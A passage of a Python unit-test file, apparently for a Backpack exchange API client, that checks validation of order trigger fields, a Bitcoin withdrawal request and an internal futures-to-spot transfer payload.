    assert obj.triggerPrice == "1750.0"
    assert obj.stopLossTriggerPrice == "1700.0"
    assert obj.stopLossTriggerBy == "MarkPrice"
    assert obj.takeProfitTriggerPrice == "2000.0"
    assert obj.takeProfitTriggerBy == "LastPrice"


def test_BackpackRawAccountWithdrawalRequest_different_blockchain_example() -> None:
    """Test with different blockchain options."""
    payload = {
        "address": "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4",
        "blockchain": "Bitcoin",
        "quantity": "0.1",
        "symbol": "BTC",
    }
    obj = BackpackRawAccountWithdrawalRequest.model_validate(payload)
    assert obj.blockchain == "Bitcoin"
    assert obj.symbol == "BTC"


def test_BackpackRawInternalTransferRequest_all_account_types_example() -> None:
    """Test with all account type combinations."""
    payload = {
        "symbol": "BTC",
        "quantity": "0.01",
        "fromAccount": "FUTURES",
        "toAccount": "SPOT",
    }
    obj = BackpackRawInternalTransferRequest.model_validate(payload)
    assert obj.fromAccount == "FUTURES"
    assert obj.toAccount == "SPOT"
